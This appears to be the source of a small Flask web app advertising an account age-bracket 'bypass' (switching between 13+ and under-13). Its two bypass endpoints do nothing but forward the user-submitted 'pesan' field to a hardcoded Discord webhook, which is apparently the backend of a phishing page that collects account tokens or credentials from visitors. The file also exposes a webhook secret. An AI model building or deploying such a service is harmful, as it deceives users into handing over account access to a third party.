from flask import Flask, render_template, request, redirect
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1452296197371985980/tc7kiT1idc_l1OVleNEutK62ZsFEBetKUbCpMnOOQXK9uNrakY5bNHRoApdxkxrBPDe0"

@app.route("/")
def dashboard():
    return render_template("index.html")

@app.route("/bypass")
def bypass_page():
    return render_template("bypassfloko.html")

@app.route("/bypass/plus13", methods=["POST"])
def bypass_plus13():
    pesan = request.form.get("pesan")
    if pesan:
        requests.post(
            WEBHOOK_URL,
            json={"content": f"🔁 CHANGE 13+ ➜ -13\n{pesan}"}
        )
    return redirect("/bypass")

@app.route("/bypass/minus13", methods=["POST"])
def bypass_minus13():
    pesan = request.form.get("pesan")
    if pesan:
        requests.post(
            WEBHOOK_URL,
            json={"content": f"🔁 CHANGE -13 ➜ 13+\n{pesan}"}
        )
    return redirect("/bypass")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)